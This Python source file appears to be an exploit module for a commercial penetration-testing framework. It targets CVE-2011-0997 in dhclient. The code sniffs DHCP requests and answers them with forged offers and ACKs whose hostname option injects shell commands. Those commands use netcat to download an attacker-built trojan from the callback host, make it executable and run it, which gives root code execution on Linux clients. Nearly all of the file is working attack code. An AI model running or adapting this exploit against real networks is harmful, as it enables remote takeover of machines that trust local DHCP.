#!/usr/bin/env python

# sean dhclient exploit

import sys
if '.' not in sys.path:
    sys.path.append('.')

import socket
import struct
import timeoutsocket
import time
import select
import localsniffer

from exploitutils import *
from canvasexploit import canvasexploit
from sniffer import sender
from sniffer import packetConstructor
from sniffer import get_ethernet_header
from sniffer import get_iface_from_target
from sniffer import checksum

from libs.canvasos import *

NAME                           = 'CVE_2011_0997 DHClient Exploit'
DESCRIPTION                    = 'DHClient shellscript escape character injection leads to command execution'
VERSION                        = '0.1'

DOCUMENTATION                  = {}
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2011-0997'
DOCUMENTATION['CVE Url']       = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0997'

PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Remote'
PROPERTY['ARCH']               = [['Linux']]

DOCUMENTATION['NOTES'] = """
-This exploit answers dhcp requests with crafted packets to get commands executed by scripts using the hostname.
 For this exploit to work, the target host it must request the hostname over dhcp.

-Tested on Fedora 14, where the commands are executed by GDM(root) when passing the hostname as a variable to mcpp over bash.
 Eg: mcpp --DHOST=random;command1;command2; --etc

-Broadcast packets don't work on Vmware virtual interface so it must be used on physical network.
"""

class Option:
    def __init__(self):
        self.optType = 0x0
        self.optLen = 0x0
        self.optVal = []

class DhcpParser:
    def __init__(self, data):
        self.data = data
        self.transId = ''
        self.clientIp = ''
        self.clientMac = ''
        self.options = {}
        self.optionsStartIdx = 240

    def parse(self):
        self.parseHeader()
        self.parseOptions()

    def parseHeader(self):
        """
        Parse out the request dependent values. Transaction ID and client MAC 
        address
        """
    
        self.transId    = ''.join(self.data[4:8])
        self.clientMac  = ''.join(self.data[28:34])

    def parseOptions(self):
        """
        Parse the options list 
        """
        
        currIdx = self.optionsStartIdx

        while 1:
            option = Option()
            tmpOptType = self.data[currIdx]
            option.optType = (struct.unpack('!B', tmpOptType)[0])

            currIdx += 1
            lenData = ''.join(self.data[currIdx])
            option.optLen = struct.unpack('!B', lenData)[0]
            
            currIdx += 1
            option.optVal = self.data[currIdx:(currIdx + option.optLen)]

            self.options[option.optType] = option
            currIdx += option.optLen

            val = struct.unpack('!B', self.data[currIdx])[0]
            if val == 0xff:
                break
            
    def getRequestIpOption(self):
        return self.options[50]

    def getTransactionId(self):
        return self.transId

    def getClientMacAddr(self):
        return self.clientMac

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.interrupt = False
        return

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.UNIVERSAL_MOSDEF]

    def dump_mac(self, mac):
        s = []
        for c in mac:
            s.append('%.2x' % ord(c))
        mac = ':'.join(s)
        return mac

    def halt(self):
        print '[+] halting ... (enter to continue)'
        sys.stdin.read(1)
        return

    def dhcp_callback(self, parser):
        
        #print '#### NEW PACKET ####'        

        packet = parser.packet
        ethernet = packet[:14]
        eth_mac_dst = ethernet[:6]
        eth_mac_src = ethernet[6:12]
        eth_type = struct.unpack('!H', ethernet[12:14])[0]
        
        #print '[+] eth dst: %s' % self.dump_mac(eth_mac_dst)
        #print '[+] eth src: %s' % self.dump_mac(eth_mac_src)
        #print '[+] type: %X' % eth_type

        # check for type IP
        if eth_type != 0x0800:
            #print '[+] skipping non-IP packet'
            return

        ip = packet[len(ethernet):len(ethernet)+20]
        ip_protocol = struct.unpack('B', ip[9])[0]

        #print '[+] protocol: %X' % ip_protocol

        if ip_protocol != 0x11:
            #print '[+] skipping non-UDP packet (for now)'
            return

        udp = packet[len(ethernet)+len(ip):len(ethernet)+len(ip)+8]
        udp_src_port = struct.unpack('!H', udp[:2])[0]
        udp_dst_port = struct.unpack('!H', udp[2:4])[0]

        #print '[+] udp src port: %d, udp dst port: %d' % (udp_src_port, udp_dst_port)

        if udp_src_port != 68 and udp_dst_port != 67:
            #print '[+] skipping non-68->67 packet ...'
            return

        # main exploit logic here
        # print '[+] bingo ... lets rock and rolll ...'

        # get bootp
        bootp = packet[len(ethernet)+len(ip)+len(udp):]

        bootp_type = struct.unpack('B', bootp[0])[0]
        if bootp_type != 0x01:
            #print '[+] ignoring non DHCP Request packet: 0x%x ...' % bootp_type
            return

        parser = DhcpParser(bootp)
        parser.parse()
        txid = parser.getTransactionId()
        cmac = parser.getClientMacAddr()

        src_ip = self.callback.ip

        # DHCP_DISCOVER
        if parser.options[0x35].optVal == "\x01":
            self.log("DHCP_DISCOVER detected")
            # Ok, lets check if it is doing a dhcp discover, will give our ip 200+random(0,50)
            dst_ip = socket.inet_aton(src_ip)
            #dst_ip = dst_ip[:3]+chr(ord(dst_ip[3])+20)
            dst_ip = dst_ip[:3]+chr(200+random.randint(0,50))
            dst_ip = socket.inet_ntoa(dst_ip)
            dhcp_type = "\x35\x01\x02"
            dhcp_broadcast = 1
        # DHCP_REQUEST
        elif parser.options[0x35].optVal == "\x03":
            self.log("DHCP_REQUEST detected")
            try:
                dst_ip = socket.inet_ntoa(parser.getRequestIpOption().optVal)
                dhcp_type = "\x35\x01\x05"
                dhcp_broadcast = 0
            except KeyError:
                self.log('Ignoring non-expected DHCP Request packet format')
                return


        else:
            # We don't handle this packet
            self.log("Ignoring DHCP type: "+parser.options[0x35].optVal.encode("hex"))
            return

        # XXX: Get the router IP from the interface?
        route_ip = socket.inet_ntoa(socket.inet_aton(dst_ip)[:3]+'\x01')

        self.log('Assigning IP: '+dst_ip)

        # BOOTP DHCP ACK
        respData  = '\x02' # message type (boot reply)
        respData += '\x01' # hardware type
        respData += '\x06' # hardware addr length
        respData += '\x00' # hops
        respData += txid
        respData += '\x00\x00' # seconds elapsed
        respData += '\x00\x00' # bootp flags
        respData += '\x00\x00\x00\x00' # client ip addr
        respData +=  socket.inet_aton(dst_ip) # your client ip addr
        respData +=  socket.inet_aton(src_ip) # next server ip addr
        respData += '\x00\x00\x00\x00' # relay agent ip addr
        respData += cmac
        respData += '\x00' * 64 # server host name
        respData += '\x00' * 138 # boot file name
        respData += '\x63\x82\x53\x63' # magic cookie
        # options
        respData += dhcp_type # DHCP Message Type: DHCP ACK/OFFER
        respData += '\x36\x04' + socket.inet_aton(src_ip) # server identifier
        respData += '\x33\x04\x00\x00\x07\x08' # lease time 30 mins
        respData += '\x01\x04\xff\xff\xff\x00' # subnet mask: 255.255.255.0, should be dynamic?
        respData += '\x1c\x04' + socket.inet_aton(src_ip)[:3] + '\xff' # broadcast address XXX: is it ok? XXX
        respData += '\x0f\x0blocaldomain' # domain name
        respData += '\x06\x04' + socket.inet_aton(src_ip) # domain name server
        respData += '\x03\x04' + socket.inet_aton(route_ip) # route server
        
        # forge hostname
        cmd = "local;nc " + src_ip + " " + str(self.fileport) + " > "+self.filename+";chmod 777 "+self.filename+";./"+self.filename+";"
        cmd = cmd.lower();

        respData += '\x0c'+chr(len(cmd))+cmd

        respData += '\xff' # end option
        # pad to 548 ?, yeah, it seems that works
        while len(respData) < 548:
            respData += '\x00'

        if dhcp_broadcast == 1:
            self.log('Sending evil OFFER ...')
        else:
            self.log('[+] Sending evil ACK ...')

        # Broadcast packet, the easy way
        dst_ip = "<broadcast>"

        self.dhcpd.sendto(respData, (dst_ip, udp_src_port))

        return

    def run(self):
        # get callback
        self.iface = self.callback.parent.interface
        #print "callback ip: ", self.callback.ip, " ,port: ", self.callback.port, " ,iface: ",self.iface

        # filename
        import string, random
        self.filename = "".join( [ random.choice(string.uppercase) for x in range(4) ] )

        # create DGRAM socket to send dhcp answers
        self.dhcpd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.dhcpd.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST,1)
        self.dhcpd.bind(('',67))
        # Testing broadcast:
        #self.dhcpd.sendto("AAAAAAAA",("<broadcast>", 68))

        # build new mosdef trojan
        t_os         = canvasos("Linux")
        t_os.arch    = "X86"
        t_os.version = "2.6"
        ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=t_os,
                                     http=False, ssl=False, universal=True)
        
        if not ret: print '[+] Error building mosdef trojan'
        # upload_server:
        from ExploitTypes.CommandLineExecuter import tcp_upload_listener
        tul = tcp_upload_listener()
        tul.data = self.mosdeftrojan
        # for gettcplistener from canvasexploit
        tul.getsock = self

        # listen
        self.fileport = 0
        while not self.fileport:
            self.fileport = random.randint(1,65535)
            try:
                tul.listen(self.fileport)
                #print "tul success with port: ", self.fileport
            except:
                #print "tul didnt success with port: ", self.fileport
                self.fileport = 0

        self.log("Serving file at port: %d" % self.fileport)

        # init sniffer ... XXX: iface setting ???
        if hasattr(self, 'engine') and \
                hasattr(self.engine, 'localsniffer') and \
                hasattr(self.engine.localsniffer, 'running') and \
                self.engine.localsniffer.running():
            sniff = self.engine.localsniffer
        else:
            sniff = localsniffer.localsniffer()
            sniff.start()
        self.log("Sniffer started")

        # register callback
        sniff.registercallback(self.dhcp_callback, 'layer(ethernet)')
        self.log("Callback registered")

        # ...
        while self.interrupt == False:
            # handle connections to serve file
            tul.accept()
            if tul.send_file():
                # make netcat close on the other side
                tul.fd.close()
                tul.fd=None
                # and return, we succeed
                break
            # interrupt on success (or whatever)
            time.sleep(0.5)

        # close listener
        tul.close()

        # shutdown sniffer
        sniff.unregistercallback(self.dhcp_callback)
        sniff.shutdown()

        return None

if __name__ == '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
